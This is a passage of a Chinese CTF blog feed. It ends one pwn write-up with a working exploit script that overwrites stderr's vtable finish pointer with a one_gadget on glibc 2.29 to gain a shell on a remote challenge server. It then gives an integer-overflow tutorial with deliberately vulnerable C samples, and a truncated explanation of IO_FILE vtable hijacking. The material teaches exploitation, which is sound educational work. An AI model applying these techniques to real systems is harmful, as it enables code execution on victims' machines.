class="params">(*_IO_finish_t)</span> <span class="params">(FILE *, <span class="keyword">int</span>)</span></span>; <span class="comment">/* finalize */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_FINISH(FP) JUMP1 (__finish, FP, 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_WFINISH(FP) WJUMP1 (__finish, FP, 0)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>对于攻击的vtable 函数 指针其中的：</p><ul><li><code>__finish__</code></li><li><code>__close</code></li></ul><p>其执行顺序是先close，然后finish。由于程序给的是0x18字节的任意写，攻击 <code>__finish__</code>就可以了。</p><p>vtable的值，以及其对应的函数指针，在glibc 2.29下是可写的。这个是很重要的一点，本来个人不知道这个，想了好久其他的办法来利用。</p><p><strong>在glibc 2.23以及glibc 2.27其都是不可写的</strong>。</p><h5 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h5><p>利用程序的最后一次任意地址写，直接把<code>__IO_2_1_stderr</code>上的vtable<code>__finish__</code>指针修改为one gadget。</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>参考大佬的脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">脚本使用的库为welpwn(github可搜)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line">      </span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>]</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment"># functions for quick script</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :ctx.send(str(data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :ctx.sendline(str(data)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :ctx.sendlineafter(str(delim), str(data)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>,timeout=<span class="number">2</span>:ctx.recv(numb, timeout=timeout)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :ctx.recvuntil(delims, drop)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :ctx.interactive()</span><br><span class="line">rs      = <span class="keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">dbg     = <span class="keyword">lambda</span> gs=<span class="string">''</span>, **kwargs    :ctx.debug(gdbscript=gs, **kwargs)</span><br><span class="line"><span class="comment"># misc functions</span></span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line">ctx.binary = <span class="string">'./secret'</span></span><br><span class="line">ctx.remote = (<span class="string">'183.129.189.60'</span>, <span class="number">10030</span>)</span><br><span class="line">ctx.remote_libc = <span class="string">'./libc.so'</span> <span class="comment"># libc-2.29</span></span><br><span class="line">ctx.debug_remote_libc  = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#rs()</span></span><br><span class="line">rs(<span class="string">'remote'</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'secret:'</span>)</span><br><span class="line">printf = int(ru(<span class="string">'\n'</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">leak(<span class="string">'printf'</span>, printf)</span><br><span class="line"></span><br><span class="line">lbase = printf - ctx.libc.sym[<span class="string">'printf'</span>]</span><br><span class="line">leak(<span class="string">'lbase'</span>, lbase)</span><br><span class="line"></span><br><span class="line">_IO_2_1_stderr_ = lbase + ctx.libc.sym[<span class="string">'_IO_2_1_stderr_'</span>]</span><br><span class="line">vtable = _IO_2_1_stderr_ + <span class="number">0xd8</span></span><br><span class="line"></span><br><span class="line">leak(<span class="string">'_IO_2_1_stderr_'</span>, _IO_2_1_stderr_)</span><br><span class="line">leak(<span class="string">'vtable'</span>, vtable)</span><br><span class="line"></span><br><span class="line">one1 = lbase + <span class="number">0xe237f</span></span><br><span class="line">one2 = lbase + <span class="number">0xe2383</span></span><br><span class="line">one3 = lbase + <span class="number">0xe2386</span></span><br><span class="line">one4 = lbase + <span class="number">0x106ef8</span></span><br><span class="line"></span><br><span class="line">s(p64(vtable))</span><br><span class="line">s(<span class="string">'\xf0\x70'</span>) <span class="comment"># 修改vtable地址低两字节 </span></span><br><span class="line">s(p64(<span class="number">0</span>)  + p64(<span class="number">0</span>) + p64(one3))</span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;想做PWN来着，结果0解，划水几道题。。。
    
    </summary>
    
    
      <category term="CTF" scheme="http://ggb0n.cool/categories/CTF/"/>
    
      <category term="比赛划水" scheme="http://ggb0n.cool/categories/CTF/%E6%AF%94%E8%B5%9B%E5%88%92%E6%B0%B4/"/>
    
    
      <category term="webshell" scheme="http://ggb0n.cool/tags/webshell/"/>
    
      <category term="IO_FILE漏洞" scheme="http://ggb0n.cool/tags/IO-FILE%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>整形溢出基础</title>
    <link href="http://ggb0n.cool/2020/06/17/%E6%95%B4%E5%BD%A2%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/"/>
    <id>http://ggb0n.cool/2020/06/17/%E6%95%B4%E5%BD%A2%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/</id>
    <published>2020-06-17T15:40:07.000Z</published>
    <updated>2020-06-17T16:20:25.663Z</updated>
    
    <content type="html"><![CDATA[<p> C 语言中，整数的基本数据类型分为短整型 (short)，整型 (int)，长整型 (long)，这三个数据类型还分为有符号和无符号，每种数据类型都有各自的大小范围（数据类型的大小范围是编译器决定），当程序中的数据超过其数据类型的范围，则会造成溢出，整数类型的溢出被称为整数溢出。<a id="more"></a></p><p>整数的表示范围以及字节数如下表：</p><p><img src="http://ggb0n.cool/images/integer1.png" alt=""></p><h3 id="溢出原理"><a href="#溢出原理" class="headerlink" title="溢出原理"></a>溢出原理</h3><p>整型溢出主要分为上界溢出和下界溢出，下面分别进行介绍。</p><h4 id="上界溢出"><a href="#上界溢出" class="headerlink" title="上界溢出"></a>上界溢出</h4><p>先看代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"># 伪代码</span><br><span class="line">short <span class="keyword">int</span> a;</span><br><span class="line"></span><br><span class="line">a = a + <span class="number">1</span>;</span><br><span class="line"># 对应的汇编</span><br><span class="line">movzx  eax, <span class="keyword">word</span> ptr [rbp - <span class="number">0x1c</span>]</span><br><span class="line">add    eax, <span class="number">1</span></span><br><span class="line">mov    <span class="keyword">word</span> ptr [rbp - <span class="number">0x1c</span>], ax</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> short <span class="keyword">int</span> b;</span><br><span class="line"></span><br><span class="line">b = b + <span class="number">1</span>;</span><br><span class="line"><span class="meta"># assembly code</span></span><br><span class="line">add    <span class="keyword">word</span> ptr [rbp - <span class="number">0x1a</span>], <span class="number">1</span></span><br></pre></td></tr></table></figure><p>上界溢出有两种情况，一种是 <code>0x7fff + 1</code>， 另一种是 <code>0xffff + 1</code>。</p><p>因为计算机底层指令是不区分有符号和无符号的，数据都是以二进制形式存在 (编译器的层面才对有符号和无符号进行区分，产生不同的汇编指令)。</p><p>所以 <code>add 0x7fff, 1 == 0x8000</code>，这种上界溢出对无符号整型就没有影响，但是在有符号短整型中，<code>0x7fff</code> 表示的是 <code>32767</code>，但是 <code>0x8000</code> 表示的是 <code>-32768</code>，用数学表达式来表示就是在有符号短整型中 <code>32767+1 == -32768</code>。</p><p>第二种情况是 <code>add 0xffff, 1</code>，这种情况需要考虑的是第一个操作数。</p><p>比如上面的有符号型加法的汇编代码是 <code>add eax, 1</code>，因为 <code>eax=0xffff</code>，所以 <code>add eax, 1 == 0x10000</code>，但是无符号的汇编代码是对内存进行加法运算 <code>add word ptr [rbp - 0x1a], 1 == 0x0000</code>。</p><p>在有符号的加法中，虽然 <code>eax</code> 的结果为 0x10000，但是只把 <code>ax=0x0000</code> 的值储存到了内存中，从结果看和无符号是一样的。</p><p>再从数字层面看看这种溢出的结果，在有符号短整型中，<code>0xffff==-1，-1 + 1 == 0</code>，从有符号看这种计算没问题。</p><p>但是在无符号短整型中，<code>0xffff == 65535, 65535 + 1 == 0</code>。</p><h4 id="下界溢出"><a href="#下界溢出" class="headerlink" title="下界溢出"></a>下界溢出</h4><p>下届溢出的道理和上界溢出一样，在汇编代码中，只是把 <code>add</code> 替换成了 <code>sub</code>。</p><p>一样也是有两种情况：</p><p>第一种是 <code>sub 0x0000, 1 == 0xffff</code>，对于有符号来说 <code>0 - 1 == -1</code> 没问题，但是对于无符号来说就成了 <code>0 - 1 == 65535</code>。</p><p>第二种是 <code>sub 0x8000, 1 == 0x7fff</code>，对于无符号来说是 <code>32768 - 1 == 32767</code> 是正确的，但是对于有符号来说就变成了 <code>-32768 - 1 = 32767</code>。</p><h3 id="典例"><a href="#典例" class="headerlink" title="典例"></a>典例</h3><p>常见的整型溢出可以总结为两种情况</p><h4 id="未限制范围"><a href="#未限制范围" class="headerlink" title="未限制范围"></a>未限制范围</h4><p>这种漏洞由于对用户输入的数值未进行过滤检查而导致，例子如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ cat test.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    <span class="keyword">int</span> data_len;</span><br><span class="line">    <span class="keyword">int</span> header_len;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line"></span><br><span class="line">    header_len = <span class="number">0x10</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%uld"</span>, &amp;data_len);</span><br><span class="line"></span><br><span class="line">    len = data_len+header_len</span><br><span class="line">    buf = <span class="built_in">malloc</span>(len);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, buf, data_len);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">$ gcc test.c</span><br><span class="line">$ ./a.out</span><br><span class="line"><span class="number">-1</span></span><br><span class="line">asdfasfasdfasdfafasfasfasdfasdf</span><br><span class="line"><span class="meta"># gdb a.out</span></span><br><span class="line">► <span class="number">0x40066d</span> &lt;main+<span class="number">71</span>&gt;    call   <span class="built_in">malloc</span>@plt &lt;<span class="number">0x400500</span>&gt;</span><br><span class="line">        <span class="built_in">size</span>: <span class="number">0xf</span></span><br></pre></td></tr></table></figure><p>只申请 <code>0x20</code> 大小的堆，但是却能输入 <code>0xffffffff</code> 长度的数据，从整型溢出到堆溢出。</p><h4 id="错误的类型转换"><a href="#错误的类型转换" class="headerlink" title="错误的类型转换"></a>错误的类型转换</h4><p>即使正确的对变量进行约束，也仍然有可能出现整数溢出漏洞，我认为可以概括为错误的类型转换，如果继续细分下去，可以分为：</p><ul><li>1、范围大的变量赋值给范围小的变量</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ cat test2.c</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!n)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"vuln"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"OK"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> a;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%ld"</span>, &amp;a);</span><br><span class="line">    <span class="keyword">if</span> (a == <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Bad"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        check(a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">$ gcc test2.c</span><br><span class="line">$ ./a.out</span><br><span class="line"><span class="number">4294967296</span></span><br><span class="line">vuln</span><br></pre></td></tr></table></figure><p>上述代码就是一个范围大的变量 (长整型 a)，传入 check 函数后变为范围小的变量 (整型变量 n)，造成整数溢出的例子。</p><p>已知长整型的占有 8 byte 的内存空间，而整型只有 4 byte 的内存空间，所以当 long -&gt; int，将会造成截断，只把长整型的低 4byte 的值传给整型变量。</p><p>在上述例子中，就是把 <code>long: 0x100000000 -&gt; int: 0x00000000</code>。</p><p>但是当范围更小的变量就能完全的把值传递给范围更大的变量，而不会造成数据丢失。</p><ul><li>2、只做了单边限制</li></ul><p>这种情况只针对有符号类型：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ cat test3.c</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len, l;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">11</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;len);</span><br><span class="line">    <span class="keyword">if</span> (len &lt; <span class="number">10</span>) &#123;</span><br><span class="line">        l = <span class="built_in">read</span>(<span class="number">0</span>, buf, len);</span><br><span class="line">        *(buf+l) = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">puts</span>(buf);</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Please len &lt; 10"</span>);        </span><br><span class="line">&#125;</span><br><span class="line">$ gcc test3.c</span><br><span class="line">$ ./a.out</span><br><span class="line"><span class="number">-1</span></span><br><span class="line">aaaaaaaaaaaa</span><br><span class="line">aaaaaaaaaaaa</span><br></pre></td></tr></table></figure><p>从表面上看，我们对变量 len 进行了限制，但是仔细思考可以发现，len 是有符号整型，所以 len 的长度可以为负数，但是在 read 函数中，第三个参数的类型是 <code>size_t</code>，该类型相当于 <code>unsigned long int</code>，属于无符号长整型</p><p>上面举例的两种情况都有一个共性，就是函数的形参和实参的类型不同，所以我认为可以总结为错误的类型转换。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt; C 语言中，整数的基本数据类型分为短整型 (short)，整型 (int)，长整型 (long)，这三个数据类型还分为有符号和无符号，每种数据类型都有各自的大小范围（数据类型的大小范围是编译器决定），当程序中的数据超过其数据类型的范围，则会造成溢出，整数类型的溢出被称为整数溢出。
    
    </summary>
    
    
      <category term="CTF" scheme="http://ggb0n.cool/categories/CTF/"/>
    
      <category term="二进制" scheme="http://ggb0n.cool/categories/CTF/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
    
      <category term="Integer Overflow" scheme="http://ggb0n.cool/tags/Integer-Overflow/"/>
    
  </entry>
  
  <entry>
    <title>IO-FILE相关</title>
    <link href="http://ggb0n.cool/2020/06/14/IO-FILE%E7%9B%B8%E5%85%B3/"/>
    <id>http://ggb0n.cool/2020/06/14/IO-FILE%E7%9B%B8%E5%85%B3/</id>
    <published>2020-06-14T14:47:29.000Z</published>
    <updated>2020-06-17T15:42:45.052Z</updated>
    
    <content type="html"><![CDATA[<p>FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。 FILE 结构在程序执行 fopen 等函数时会进行创建，并分配在堆中。<a id="more"></a></p><h3 id="FILE结构"><a href="#FILE结构" class="headerlink" title="FILE结构"></a>FILE结构</h3><p>定义一个指向 FILE 结构的指针来接收这个返回值。FILE 结构定义在 <code>libio.h</code> 中，如下所示</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> short _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>进程中的 FILE 结构会通过_chain 域彼此连接形成一个链表，链表头部用全局变量_IO_list_all 表示，通过这个值我们可以遍历所有的 FILE 结构。</p><p>在标准 I/O 库中，每个程序启动时有三个文件流是自动打开的：stdin、stdout、stderr。因此在初始状态下，_IO_list_all 指向了一个有这些文件流构成的链表，但是需要注意的是这三个文件流位于 libc.so 的数据段。而我们使用 fopen 创建的文件流是分配在堆内存上的。</p><p>我们可以在 libc.so 中找到 stdin\stdout\stderr 等符号，这些符号是指向 FILE 结构的指针，真正结构的符号是：</p><figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="variable">_IO_2_1_stderr_</span></span><br><span class="line"><span class="variable">_IO_2_1_stdout_</span></span><br><span class="line"><span class="variable">_IO_2_1_stdin_</span></span><br></pre></td></tr></table></figure><p>但是事实上_IO_FILE 结构外包裹着另一种结构_IO_FILE_plus，其中包含了一个重要的指针 vtable 指向了一系列函数指针。</p><p>在 libc2.23 版本下，32 位的 vtable 偏移为 <code>0x94</code>，64 位偏移为 <code>0xd8</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    _IO_FILE    file;</span><br><span class="line">    IO_jump_t   *vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vtable 是 IO_jump_t 类型的指针，IO_jump_t 中保存了一些函数指针，在后面我们会看到在一系列标准 IO 函数中会调用这些函数指针：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> * funcs[] = &#123;</span><br><span class="line">   <span class="number">1</span> <span class="literal">NULL</span>, <span class="comment">// "extra word"</span></span><br><span class="line">   <span class="number">2</span> <span class="literal">NULL</span>, <span class="comment">// DUMMY</span></span><br><span class="line">   <span class="number">3</span> <span class="built_in">exit</span>, <span class="comment">// finish</span></span><br><span class="line">   <span class="number">4</span> <span class="literal">NULL</span>, <span class="comment">// overflow</span></span><br><span class="line">   <span class="number">5</span> <span class="literal">NULL</span>, <span class="comment">// underflow</span></span><br><span class="line">   <span class="number">6</span> <span class="literal">NULL</span>, <span class="comment">// uflow</span></span><br><span class="line">   <span class="number">7</span> <span class="literal">NULL</span>, <span class="comment">// pbackfail</span></span><br><span class="line">   </span><br><span class="line">   <span class="number">8</span> <span class="literal">NULL</span>, <span class="comment">// xsputn  #printf</span></span><br><span class="line">   <span class="number">9</span> <span class="literal">NULL</span>, <span class="comment">// xsgetn</span></span><br><span class="line">   <span class="number">10</span> <span class="literal">NULL</span>, <span class="comment">// seekoff</span></span><br><span class="line">   <span class="number">11</span> <span class="literal">NULL</span>, <span class="comment">// seekpos</span></span><br><span class="line">   <span class="number">12</span> <span class="literal">NULL</span>, <span class="comment">// setbuf</span></span><br><span class="line">   <span class="number">13</span> <span class="literal">NULL</span>, <span class="comment">// sync</span></span><br><span class="line">   <span class="number">14</span> <span class="literal">NULL</span>, <span class="comment">// doallocate</span></span><br><span class="line">   <span class="number">15</span> <span class="literal">NULL</span>, <span class="comment">// read</span></span><br><span class="line">   <span class="number">16</span> <span class="literal">NULL</span>, <span class="comment">// write</span></span><br><span class="line">   <span class="number">17</span> <span class="literal">NULL</span>, <span class="comment">// seek</span></span><br><span class="line">   <span class="number">18</span> pwn,  <span class="comment">// close</span></span><br><span class="line">   <span class="number">19</span> <span class="literal">NULL</span>, <span class="comment">// stat</span></span><br><span class="line">   <span class="number">20</span> <span class="literal">NULL</span>, <span class="comment">// showmanyc</span></span><br><span class="line">   <span class="number">21</span> <span class="literal">NULL</span>, <span class="comment">// imbue</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><h4 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h4><p>fread 是标准 IO 库函数，作用是从文件流中读数据，函数原型如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">fread</span> <span class="params">( <span class="keyword">void</span> *<span class="built_in">buffer</span>, <span class="keyword">size_t</span> <span class="built_in">size</span>, <span class="keyword">size_t</span> count, FILE *stream)</span> </span>;</span><br></pre></td></tr></table></figure><ul><li>buffer 存放读取数据的缓冲区。</li><li>size：指定每个记录的长度。</li><li>count： 指定记录的个数。</li><li>stream：目标文件流。</li><li>返回值：返回读取到数据缓冲区中的记录个数</li></ul><p>fread 的代码位于 <code>/ libio/iofread.c</code> 中，函数名为<code>\_IO_fread</code>，但真正的功能实现在子函数_IO_sgetn 中。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_fread (buf, <span class="built_in">size</span>, count, fp)</span><br><span class="line">     <span class="keyword">void</span> *buf;</span><br><span class="line">     _IO_size_t <span class="built_in">size</span>;</span><br><span class="line">     _IO_size_t count;</span><br><span class="line">     _IO_FILE *fp;</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  bytes_read = _IO_sgetn (fp, (<span class="keyword">char</span> *) buf, bytes_requested);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>\_IO_sgetn</code> 函数中会调用<code>\_IO_XSGETN</code>，而<code>\_IO_XSGETN</code> 是<code>_IO_FILE_plus.vtable</code> 中的函数指针，在调用这个函数时会首先取出 vtable 中的指针然后再进行调用。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_sgetn (fp, data, n)</span><br><span class="line">     _IO_FILE *fp;</span><br><span class="line">     <span class="keyword">void</span> *data;</span><br><span class="line">     _IO_size_t n;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> _IO_XSGETN (fp, data, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在默认情况下函数指针是指向_IO_file_xsgetn 函数的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_buf_base</span><br><span class="line">        &amp;&amp; want &lt; (<span class="keyword">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (__underflow (fp) == EOF)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><h4 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h4><p>fwrite 同样是标准 IO 库函数，作用是向文件流写入数据，函数原型如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">fwrite</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* <span class="built_in">buffer</span>, <span class="keyword">size_t</span> <span class="built_in">size</span>, <span class="keyword">size_t</span> count, FILE* stream)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>buffer: 是一个指针，对 fwrite 来说，是要写入数据的地址;</li><li>size: 要写入内容的单字节数;</li><li>count: 要进行写入 size 字节的数据项的个数;</li><li>stream: 目标文件指针;</li><li>返回值：实际写入的数据项个数 count。</li></ul><p>fwrite 的代码位于 /libio/iofwrite.c 中，函数名为<code>\_IO_fwrite</code>。 在_IO_fwrite 中主要是调用_IO_XSPUTN 来实现写入的功能。</p><p>根据前面对<code>\_IO_FILE_plus</code> 的介绍，可知<code>\_IO_XSPUTN</code> 位于<code>_IO_FILE_plus</code> 的 vtable 中，调用这个函数需要首先取出 vtable 中的指针，再跳过去进行调用。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">written = _IO_sputn (fp, (<span class="keyword">const</span> <span class="keyword">char</span> 